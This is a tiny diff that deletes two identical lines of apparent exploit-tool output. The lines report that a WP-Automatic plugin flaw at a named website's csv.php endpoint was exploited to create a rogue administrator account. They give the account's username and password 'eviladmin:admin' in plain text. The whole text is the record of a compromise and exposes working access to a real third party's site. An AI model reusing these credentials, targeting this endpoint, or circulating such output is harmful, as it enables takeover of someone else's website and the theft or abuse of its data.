@@ -1,2 +1,0 @@
-Exploit completed! administrator created: eviladmin:admin: https://www.bangaluru.com/wp-content/plugins/wp-automatic/inc/csv.php
-Exploit completed! administrator created: eviladmin:admin: https://www.bangaluru.com/wp-content/plugins/wp-automatic/inc/csv.php
